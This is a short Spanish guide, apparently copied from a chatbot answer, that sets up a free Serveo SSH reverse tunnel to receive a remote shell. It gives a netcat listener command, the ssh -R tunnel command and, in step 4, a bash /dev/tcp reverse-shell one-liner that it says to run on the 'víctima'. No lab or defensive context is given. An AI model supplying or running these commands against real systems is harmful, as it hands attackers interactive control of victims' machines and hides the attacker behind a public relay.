
### 1. **Serveo.net (SSH reverse tunnel gratuito)**

No requiere registro ni pago. Solo necesitas tener SSH instalado en tu máquina local.

1. En tu local, lanza el listener de Netcat:
    
    bash
    
    CopiarEditar
    
    `nc -lvnp 4444`
    
2. En otra terminal, crea el túnel con Serveo:
    
    bash
    
    CopiarEditar
    
    `ssh -R 0:localhost:4444 serveo.net`
    
    – La opción `-R 0:localhost:4444` pide a Serveo un puerto aleatorio que redirija a tu `localhost:4444`.
    
3. Tras conectar, SSH te mostrará algo como:
    
    rust
    
    CopiarEditar
    
    `Forwarding TCP port 19999 -> localhost:4444`
    
    Esto significa que `serveo.net:19999` apunta a tu listener.
    
4. En la víctima ejecutas, por ejemplo:
    
    bash
    
    CopiarEditar
    
    `bash -i >& /dev/tcp/serveo.net/19999 0>&1`